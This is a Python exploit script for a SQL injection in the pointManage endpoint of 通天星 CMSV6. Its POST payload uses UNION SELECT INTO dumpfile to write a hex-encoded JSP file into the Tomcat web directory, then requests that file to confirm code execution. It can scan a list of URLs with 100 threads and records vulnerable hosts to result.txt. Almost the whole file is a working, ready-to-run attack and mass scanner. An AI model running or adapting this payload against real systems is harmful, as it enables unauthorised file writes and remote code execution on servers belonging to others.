#通天星CMSV6 pointManage存在SQL注入可写入文件RCE

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

def banner():
    text = '''

   ▄████████ ████████▄    ▄█             ▄█  ███▄▄▄▄        ▄█    ▄████████  ▄████████     ███      ▄█   ▄██████▄  ███▄▄▄▄   
  ███    ███ ███    ███  ███            ███  ███▀▀▀██▄     ███   ███    ███ ███    ███ ▀█████████▄ ███  ███    ███ ███▀▀▀██▄ 
  ███    █▀  ███    ███  ███            ███▌ ███   ███     ███   ███    █▀  ███    █▀     ▀███▀▀██ ███▌ ███    ███ ███   ███ 
  ███        ███    ███  ███            ███▌ ███   ███     ███  ▄███▄▄▄     ███            ███   ▀ ███▌ ███    ███ ███   ███ 
▀███████████ ███    ███  ███            ███▌ ███   ███     ███ ▀▀███▀▀▀     ███            ███     ███▌ ███    ███ ███   ███ 
         ███ ███    ███  ███            ███  ███   ███     ███   ███    █▄  ███    █▄      ███     ███  ███    ███ ███   ███ 
   ▄█    ███ ███  ▀ ███  ███▌    ▄      ███  ███   ███     ███   ███    ███ ███    ███     ███     ███  ███    ███ ███   ███ 
 ▄████████▀   ▀██████▀▄█ █████▄▄██      █▀    ▀█   █▀  █▄ ▄███   ██████████ ████████▀     ▄████▀   █▀    ▀██████▀   ▀█   █▀  
                         ▀                             ▀▀▀▀▀▀                                                                
                                                                    info:通天星CMSV6 pointManage存在SQL注入可写入文件RCE
                                                                    version:1.0 author:YeahSir  
'''
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description="通天星CMSV6 pointManage存在SQL注入可写入文件RCE")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/point_manage/merge'
    url = target + url_payload
    # print(url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2882.93 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = (
        "id=1&name=1' UNION SELECT%0aNULL, 0x3c25206f75742e7072696e7428227a7a3031306622293b206e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b20253e,NULL,NULL,NULL,NULL,NULL,NULL"
        " INTO dumpfile '../../tomcat/webapps/gpsweb/allgods.jsp' FROM user_session a"
        " WHERE '1 '='1 &type=3&map_id=4&install_place=5&check_item=6&create_time=7&update_time=8"
    )
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        payload2 = '/allgods.jsp'
        url2 = target + payload2
        response1 = requests.get(url=url2,proxies=proxies)
        if response.status_code == 200 and response1.status_code == 200 and "zz010f" in response1.text:
            print( f"{GREEN}[+] {target} 存在sql注入漏洞{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
                return True
        else:
            print("[-] 漏洞不存在!!")
            return False
    except Exception as e:
        print(f"[*] 该url出现错误:{target}, 错误信息：{str(e)}")


if __name__ == '__main__':
    main()